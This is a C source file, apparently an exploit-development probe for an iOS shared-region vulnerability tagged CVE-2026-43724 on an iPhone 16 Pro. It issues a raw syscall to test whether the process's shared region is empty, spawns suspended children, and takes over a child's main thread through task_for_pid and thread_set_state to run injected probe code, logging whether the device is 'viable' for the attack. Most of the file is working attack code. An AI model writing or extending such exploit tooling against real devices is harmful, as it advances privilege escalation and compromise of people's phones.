/*
 * host_probe.c — iOS probe for the CVE-2026-43724 (DirtySlide/Rie) primitive.
 *
 * Device: iPhone 16 Pro (A18 Pro), iOS 26.4, xnu-12377.102.10, sandboxed, get-task-allow.
 *
 * Q1  Is OUR OWN shared region empty?   syscall 294 (shared_region_check_np)
 *       errno 12 (ENOMEM) = bound but EMPTY  => we can be the #536 first-mapper ourselves
 *       errno 0          = already populated (dyld cache mapped)
 * Q2  Can we spawn anything?             posix_spawn(START_SUSPENDED|RESLIDE) against
 *       { bundled libchild.dylib, our own executable, /bin/sh, a missing path } -> errno each
 * Q3  If a child spawned: task_for_pid -> task_threads -> locate its exec base ->
 *       hijack the suspended main thread to child_probe() -> read its exit errno
 *       12 = BOUND-but-EMPTY => viable #536 first-mapper   [the prize]
 *
 * Output: $HOME/Documents/result.txt
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/spawn.h>
#include <sys/wait.h>
#include <mach/mach.h>
#include <mach/arm/thread_state.h>
#include <mach-o/loader.h>
#include <mach-o/dyld.h>

#ifndef _POSIX_SPAWN_RESLIDE
#define _POSIX_SPAWN_RESLIDE 0x0080
#endif
#ifndef vm_task_t
typedef mach_port_t vm_task_t;
#endif

extern kern_return_t mach_vm_read_overwrite(vm_task_t target_task, vm_address_t address,
                                             vm_size_t size, vm_address_t data,
                                             vm_size_t *out_size);
extern kern_return_t mach_vm_region_recurse(vm_task_t target_task, vm_address_t *address,
                                             vm_size_t *size, natural_t *depth,
                                             void *info, mach_msg_type_number_t *count);

extern char **environ;

#include "probe_off.h"   /* #define PROBE_OFFSET 0x... (child_probe - child __TEXT base) */

static char g_out[8192];
static size_t g_len;

static void say(const char *fmt, ...)
{
	char buf[1024];
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	fprintf(stderr, "%s", buf);
	size_t l = strlen(buf);
	if (g_len + l < sizeof(g_out) - 1) {
		memcpy(g_out + g_len, buf, l);
		g_len += l;
		g_out[g_len] = 0;
	}
}

static void flush_result(void)
{
	const char *home = getenv("HOME");
	if (!home) { say("no HOME\n"); return; }
	char dir[1024], path[1200];
	snprintf(dir, sizeof(dir), "%s/Documents", home);
	mkdir(dir, 0755);
	snprintf(path, sizeof(path), "%s/result.txt", dir);
	int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd < 0) { say("open(%s) errno=%d\n", path, errno); return; }
	write(fd, g_out, g_len);
	close(fd);
	say("wrote %s (%zu bytes)\n", path, g_len);
}

static long raw_syscall(long num, long a0, long a1, long a2, long a3, long *err_out)
{
	register long x16 asm("x16") = num;
	register long x0 asm("x0") = a0;
	register long x1 asm("x1") = a1;
	register long x2 asm("x2") = a2;
	register long x3 asm("x3") = a3;
	long carry = 0;
	asm volatile("svc #0x80\n\tcset %1, cs\n\t"
	             : "+r"(x0), "=r"(carry)
	             : "r"(x16), "r"(x1), "r"(x2), "r"(x3)
	             : "cc", "memory");
	if (err_out) *err_out = carry ? (x0 & 0xff) : 0;
	return carry ? -1 : x0;
}

static int region_state(void)
{
	unsigned long long scratch = 0;
	long err = 0;
	raw_syscall(294, (long)&scratch, 0, 0, 0, &err);
	return (int)err;
}

static vm_address_t find_exec_base(vm_task_t task)
{
	vm_address_t addr = 0;
	vm_size_t size = 0;
	natural_t depth = 0;
	for (;;) {
		uint8_t buf[512];
		mach_msg_type_number_t cnt = 4096;
		if (mach_vm_region_recurse(task, &addr, &size, &depth, (void *)buf, &cnt) != 0)
			break;
		uint32_t hdr[4] = {0};
		vm_size_t got = 0;
		if (mach_vm_read_overwrite(task, addr, sizeof(hdr), (vm_address_t)hdr, &got) == 0 &&
		    got == sizeof(hdr) && hdr[0] == MH_MAGIC_64 && hdr[3] == MH_EXECUTE)
			return addr;
		addr += size;
	}
	return 0;
}

static int try_spawn(const char *path, pid_t *out_pid, int *out_errno)
{
	if (!path || !*path) return -1;
	posix_spawnattr_t attr;
	posix_spawnattr_init(&attr);
	short flags = (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE);
	posix_spawnattr_setflags(&attr, flags);
	char *args[] = { (char *)path, NULL };
	pid_t pid = -1;
	int rc = posix_spawn(&pid, path, NULL, &attr, args, environ);
	posix_spawnattr_destroy(&attr);
	int e = (rc != 0) ? errno : 0;
	say("  spawn(%s) rc=%d errno=%d pid=%d\n", path, rc, e, pid);
	if (out_errno) *out_errno = e;
	if (rc == 0 && out_pid) *out_pid = pid;
	return rc;
}


static int try_spawn_flags(const char *tag, const char *path, short flags, pid_t *out_pid, int *out_errno)
{
	posix_spawnattr_t attr;
	posix_spawnattr_init(&attr);
	posix_spawnattr_setflags(&attr, flags);
	char *args[] = { (char *)path, NULL };
	pid_t pid = -1;
	int rc = posix_spawn(&pid, path, NULL, &attr, args, environ);
	posix_spawnattr_destroy(&attr);
	int e = (rc != 0) ? errno : 0;
	say("  [%s] spawn(%.60s) rc=%d errno=%d pid=%d\\n", tag, path, rc, e, pid);
	if (out_errno) *out_errno = e;
	if (rc == 0 && out_pid) *out_pid = pid;
	return rc;
}

int main(void)
{
	char selfexe[1200] = {0}, lib[1200] = {0};
	uint32_t sz = (uint32_t)sizeof(selfexe);
	if (_NSGetExecutablePath(selfexe, &sz) != 0) selfexe[0] = 0;
	{
		char *slash = strrchr(selfexe, '/');
		if (slash) {
			size_t dirlen = (size_t)(slash - selfexe) + 1;
			snprintf(lib, sizeof(lib), "%.*slibchild.dylib", (int)dirlen, selfexe);
		}
	}
	say("self exe : %s\n", selfexe);
	say("child    : %s\n", lib);

	int st = region_state();
	say("Q1 own_region_check_np errno=%d (%s)\n", st,
	    st == 12 ? "BOUND-but-EMPTY => VIABLE for #536 first-mapper" :
	    st == 0  ? "populated (cache already mapped)" :
	    st == 22 ? "EINVAL: no region bound" : "other");

	pid_t p_lib = -1, p_self = -1, p_sh = -1, p_none = -1;
	int e_lib = 0, e_self = 0, e_sh = 0, e_none = 0;
	int rc_lib = try_spawn(lib, &p_lib, &e_lib);
	int rc_self = try_spawn(selfexe, &p_self, &e_self);
	int rc_sh = try_spawn("/bin/sh", &p_sh, &e_sh);
	int rc_none = try_spawn("/does/not/exist", &p_none, &e_none);
	say("Q2 rc   : lib=%d self=%d sh=%d missing=%d\n", rc_lib, rc_self, rc_sh, rc_none);
	say("Q2 err  : lib=%d self=%d sh=%d missing=%d\n", e_lib, e_self, e_sh, e_none);


	/* Q2b: which spawn flag (if any) is the blocker? */
	{
		pid_t p1 = -1, p2 = -1, p3 = -1, p4 = -1;
		int e1 = 0, e2 = 0, e3 = 0, e4 = 0;
		int r1 = try_spawn_flags("reslide+susp", selfexe, (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE), &p1, &e1);
		int r2 = try_spawn_flags("susp-only", selfexe, (short)POSIX_SPAWN_START_SUSPENDED, &p2, &e2);
		int r3 = try_spawn_flags("no-flags", selfexe, (short)0, &p3, &e3);
		int r4 = try_spawn_flags("reslide-only", selfexe, (short)_POSIX_SPAWN_RESLIDE, &p4, &e4);
		say("Q2b rc : reslide+susp=%d susp=%d none=%d reslide=%d\n", r1, r2, r3, r4);
		say("Q2b err: reslide+susp=%d susp=%d none=%d reslide=%d\n", e1, e2, e3, e4);
		if (r2 == 0 && p2 > 0) { say("Q2b SUSPENDED-ONLY SPAWN WORKED pid=%d\n", p2); kill(p2, SIGKILL); }
		if (r3 == 0 && p3 > 0) { say("Q2b PLAIN SPAWN WORKED pid=%d\n", p3); kill(p3, SIGKILL); }
	}

	if (rc_lib == 0 && p_lib > 0) {
		task_t ctask = TASK_NULL;
		kern_return_t kr = task_for_pid(mach_task_self(), p_lib, &ctask);
		say("Q3 task_for_pid kr=0x%x (%s)\n", kr, mach_error_string(kr));
		if (kr == KERN_SUCCESS) {
			thread_act_array_t threads = NULL;
			mach_msg_type_number_t nt = 0;
			kr = task_threads(ctask, &threads, &nt);
			say("Q3 task_threads kr=0x%x n=%u\n", kr, nt);
			if (kr == KERN_SUCCESS && nt > 0) {
				vm_address_t base = find_exec_base(ctask);
				say("Q3 child exec base=0x%llx\n", (unsigned long long)base);
				if (base) {
					arm_thread_state64_t s;
					mach_msg_type_number_t sc = ARM_THREAD_STATE64_COUNT;
					kr = thread_get_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&s, &sc);
					say("Q3 thread_get_state kr=0x%x pc=0x%llx sp=0x%llx\n", kr,
					    (unsigned long long)s.__pc, (unsigned long long)s.__sp);
					if (kr == KERN_SUCCESS) {
						s.__pc = base + PROBE_OFFSET;
						s.__sp &= ~0xFULL;
						kr = thread_set_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&s, sc);
						say("Q3 thread_set_state kr=0x%x (pc=0x%llx)\n", kr,
						    (unsigned long long)s.__pc);
						if (kr == KERN_SUCCESS) {
							kr = task_resume(ctask);
							say("Q3 task_resume kr=0x%x\n", kr);
							int status = 0;
							if (waitpid(p_lib, &status, 0) > 0) {
								if (WIFEXITED(status)) {
									int code = WEXITSTATUS(status);
									say("Q3 RESULT child_probe exit=%d (%s)\n", code,
									    code == 12 ? "BOUND-but-EMPTY => VIABLE #536 FIRST-MAPPER" :
									    code == 0 ? "populated" : "other");
								} else if (WIFSIGNALED(status)) {
									say("Q3 RESULT child killed by signal %d\n", WTERMSIG(status));
								}
							}
						}
					}
				}
			}
		}
		kill(p_lib, SIGKILL);
	}

	flush_result();
	return 0;
}
